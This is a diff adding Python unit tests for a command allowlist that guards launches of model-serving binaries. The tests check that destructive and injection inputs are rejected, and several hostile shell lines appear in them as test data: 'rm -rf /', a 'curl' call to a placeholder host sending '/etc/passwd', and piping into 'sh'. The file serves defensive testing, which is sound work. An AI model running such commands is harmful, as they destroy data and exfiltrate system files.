@@ -200,3 +200,67 @@ class RelayStreamTests(unittest.TestCase):
         asyncio.run(run())
         self.assertEqual(closed["n"], 1)
         self.assertEqual(sent[0]["kind"], "start")
+
+
+class ExecAllowlistTests(unittest.TestCase):
+    def test_allows_model_serving_binaries(self):
+        self.assertTrue(dc.exec_command_allowed("mlx_lm.server --port 8080"))
+        self.assertTrue(dc.exec_command_allowed("mtplx --draft 3"))
+        self.assertTrue(dc.exec_command_allowed("vllm --model Qwen3.8-27B"))
+
+    def test_rejects_non_allowlisted_and_paths(self):
+        self.assertFalse(dc.exec_command_allowed("rm -rf /"))
+        self.assertFalse(dc.exec_command_allowed("bash -c 'curl evil'"))
+        self.assertFalse(dc.exec_command_allowed("/usr/bin/mlx_lm.server"))
+        self.assertFalse(dc.exec_command_allowed("../mlx_lm.server"))
+        self.assertFalse(dc.exec_command_allowed(""))
+
+    def test_rejects_shell_metacharacter_smuggling(self):
+        # reika PLAT-999 P1: shell metacharacters must never pass the allowlist
+        # (host runs argv, not a shell — reject here as defense in depth).
+        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 && curl http://evil/$(cat /etc/passwd)"))
+        self.assertFalse(dc.exec_command_allowed("mlx_lm.server; rm -rf /"))
+        self.assertFalse(dc.exec_command_allowed("mlx_lm.server | sh"))
+        self.assertFalse(dc.exec_command_allowed("mtplx --draft 3 & sleep 999"))
+        self.assertFalse(dc.exec_command_allowed("vllm --model x > /tmp/pwn"))
+        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 `id`"))
+        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 $(whoami)"))
+        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 < /etc/passwd"))
+        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 (touch /tmp/x)"))
+        # Legitimate allowlisted commands with flags still pass.
+        self.assertTrue(dc.exec_command_allowed("mlx_lm.server --port 8080 --model Qwen3.8-27B"))
+        self.assertTrue(dc.exec_command_allowed("vllm --model Qwen3.8-27B --max-model-len 32768"))
+
+
+class ExecCommandTests(unittest.IsolatedAsyncioTestCase):
+    async def test_exec_streams_allowlisted_command_output(self):
+        original = dc.EXEC_ALLOWLIST
+        dc.EXEC_ALLOWLIST = ("echo",)
+        self.addCleanup(setattr, dc, "EXEC_ALLOWLIST", original)
+        sent = []
+
+        async def send(obj):
+            sent.append(obj)
+
+        await dc.exec_command(
+            {"id": "e1", "kind": "exec", "command": "echo hello-exec", "timeout_s": 10},
+            send,
+        )
+        self.assertEqual(sent[0]["kind"], "start")
+        self.assertEqual(sent[0]["status"], 200)
+        chunks = b"".join(b64d(m.get("body_b64", "")) for m in sent if m.get("kind") == "chunk")
+        self.assertIn(b"hello-exec", chunks)
+        self.assertEqual(sent[-1]["kind"], "end")
+
+    async def test_exec_rejects_non_allowlisted_command(self):
+        sent = []
+
+        async def send(obj):
+            sent.append(obj)
+
+        await dc.exec_command(
+            {"id": "e2", "kind": "exec", "command": "rm -rf /", "timeout_s": 10},
+            send,
+        )
+        self.assertEqual(sent[0]["kind"], "response")
+        self.assertEqual(sent[0]["status"], 403)
